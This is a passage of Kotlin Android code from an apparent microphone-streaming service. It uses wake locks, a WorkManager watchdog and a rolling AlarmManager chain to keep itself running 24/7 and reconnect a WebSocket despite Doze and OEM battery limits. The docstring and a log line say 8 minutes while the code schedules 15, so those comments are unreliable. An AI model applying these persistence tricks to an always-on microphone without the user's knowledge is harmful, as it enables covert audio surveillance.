            if (staticWakeLock == null) {
                staticWakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "MicMonitor::AudioWakeLock"
                ).apply {
                    setReferenceCounted(false)
                }
            }
            // BUG-C4 fix: Always re-acquire with 30-min timeout on every call.
            // Removes the isHeld guard so KeepAliveWorker (15 min), health status,
            // and audio loop calls all renew the lock before it expires.
            // OEM battery managers tolerate timed locks better than indefinite ones.
            staticWakeLock?.acquire(30 * 60 * 1000L)
            wakeLock = staticWakeLock
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // WorkManager watchdog — keeps service alive 24/7
    // ────────────────────────────────────────────────────────────────────────

    private fun scheduleKeepAlive() {
        val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "keep_alive",
            ExistingPeriodicWorkPolicy.UPDATE,
            request
        )
        Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
    }

    /**
     * Schedules a one-shot AlarmManager alarm 8 minutes from now.
     * On fire, sends ACTION_RECONNECT to this service — survives Doze better
     * than coroutines because AlarmManager uses ELAPSED_REALTIME_WAKEUP.
     * The alarm reschedules itself each time it fires, creating a rolling chain.
     */
    private fun scheduleReconnectAlarm() {
        val now = SystemClock.elapsedRealtime()
        // BUG-H2 fix: Only skip if a future alarm is truly pending.
        // After reboot, reconnectAlarmTriggerAtElapsed resets to 0 so this
        // always re-arms the rolling alarm chain. Scheduling when WS is
        // connected is harmless — the alarm handler checks WS health.
        if (reconnectAlarmTriggerAtElapsed > now) {
            Log.d(TAG, "Reconnect alarm: already pending; skipping")
            return
        }
        val intent = Intent(applicationContext, MicService::class.java).apply {
            action = ACTION_RECONNECT
            // Fix: Use a STATIC data URI so Intent.filterEquals matches the old alarm,
            // allowing AlarmManager to replace it instead of leaking thousands of alarms.
            data = android.net.Uri.parse("timer:reconnect")
        }
        val pendingIntent = PendingIntent.getService(
            applicationContext, 
            1005, // Fixed request code to overwrite existing PendingIntent
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = now + 15 * 60 * 1000L // DOZE SAFE: Must be >= 9 mins, 15 is standard
        reconnectAlarmTriggerAtElapsed = triggerAt
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Bug 1.8: Check if we should reschedule after inexact alarm fires
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
                alarmManager.setAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent
                )
                Log.w(TAG, "Exact alarm permission denied, using inexact fallback (will reschedule on fire)")
            } else {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    triggerAt,
                    pendingIntent
                )
            }
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "Reconnect alarm scheduled in 8 min")
    }
}
